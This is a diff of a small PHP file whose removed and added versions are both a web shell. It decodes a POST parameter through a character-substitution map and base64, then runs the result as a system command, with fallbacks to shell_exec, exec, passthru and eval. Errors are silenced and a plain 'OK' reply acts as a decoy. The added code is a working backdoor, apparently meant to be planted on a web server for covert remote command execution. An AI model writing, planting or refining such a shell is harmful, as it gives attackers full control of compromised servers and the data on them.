@@ -1,16 +1,30 @@
 <?php
-$GLOBALS['x1'] = 's'.'y'.'s'.'t'.'e'.'m';
-$GLOBALS['x2'] = 'd'.'a'.'t'.'a';
-$GLOBALS['x3'] = array("|"=>"a","!"=>"b","@"=>"c","_"=>"d","~"=>"=");
-$GLOBALS['x4'] = 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e';
+@error_reporting(0);
+@ini_set('display_errors',0);
 
-if(isset($_POST[$GLOBALS['x2']])){
-    $d = $_POST[$GLOBALS['x2']];
-    $r = strtr($d, $GLOBALS['x3']);
-    $c = $GLOBALS['x4']($r);
-    $f = $GLOBALS['x1'];
-    $f($c);
-}else{
-    echo "200 OK";
+if(isset($_POST['data'])){
+    $data = $_POST['data'];
+    $map = array("|"=>"a","!"=>"b","@"=>"c","_"=>"d","~"=>"=");
+    $decoded = strtr($data, $map);
+    $cmd = base64_decode($decoded);
+    
+    if($cmd){
+        echo "->|";
+        if(function_exists('system')){
+            system($cmd);
+        }elseif(function_exists('shell_exec')){
+            echo shell_exec($cmd);
+        }elseif(function_exists('exec')){
+            exec($cmd,$output);
+            echo implode("\n",$output);
+        }elseif(function_exists('passthru')){
+            passthru($cmd);
+        }else{
+            eval($cmd);
+        }
+        echo "|<-";
+    }
+    exit;
 }
+echo "OK";
 ?>
